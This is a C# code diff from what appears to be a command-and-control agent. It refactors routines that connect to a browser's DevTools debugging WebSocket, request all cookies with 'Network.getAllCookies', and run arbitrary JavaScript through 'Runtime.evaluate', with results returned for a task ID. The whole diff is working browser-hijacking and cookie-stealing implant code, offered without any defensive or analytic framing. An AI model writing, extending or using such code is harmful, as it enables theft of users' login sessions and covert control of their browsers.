@@ -1,4 +1,5 @@
 ﻿using Agent.Interfaces;
+using cursed.Models;
 using System.Text.Json;
 
 namespace Agent
@@ -36,14 +37,9 @@ namespace Agent
                 }
 
                 // Send a message to request cookies
-                var message = new
-                {
-                    id = 1,
-                    method = "Network.getAllCookies",
-                };
-                //Send our request
-                string messageJson = JsonSerializer.Serialize(message);
-                if(!WebSocketHelper.TrySendMessage(webSocket, messageJson).Result)
+                DebugEvaluator message = new DebugEvaluator("Network.getAllCookies");
+            
+                if(!WebSocketHelper.TrySendMessage(webSocket, message.toJson()).Result)
                 {
                     return "";
                 }
@@ -76,7 +72,7 @@ namespace Agent
             {
                 if (this.config.debug)
                 {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString(), task_id);
+                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
                 }
             }
             response = "";
@@ -93,7 +89,7 @@ namespace Agent
             {
                 if (this.config.debug)
                 {
-                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + e.ToString() , task_id);
+                    ReturnOutput("Failed to parse URI: " + extension.webSocketDebuggerUrl + Environment.NewLine + e.ToString(), task_id);
                 }
                 return "";
             }
@@ -117,7 +113,7 @@ namespace Agent
                 }
 
                 // Build the DevTools Protocol message to execute JavaScript
-                var message = new
+                var message2 = new
                 {
                     id = 1,
                     method = "Runtime.evaluate",
@@ -127,24 +123,10 @@ namespace Agent
                         returnByValue = true
                     }
                 };
-
-                // Convert the message to JSON and send it to the WebSocket
-                string messageJson = string.Empty;
-
-                try
-                {
-                    messageJson = JsonSerializer.Serialize(message);
-                }
-                catch (Exception e)
-                {
-                    if (this.config.debug)
-                    {
-                        ReturnOutput("Error Serializing Message" + Environment.NewLine + jsCode + Environment.NewLine + e.ToString(), task_id);
-                    }
-                    return "";
-                }
-
-                if (!WebSocketHelper.TrySendMessage(webSocket, messageJson).Result)
+                var message = new RuntimeEvaluator(jsCode);
+                Console.WriteLine(message.toJson());
+                Console.WriteLine(JsonSerializer.Serialize(message2));
+                if (!WebSocketHelper.TrySendMessage(webSocket, message.toJson()).Result)
                 {
                     if (this.config.debug)
                     {
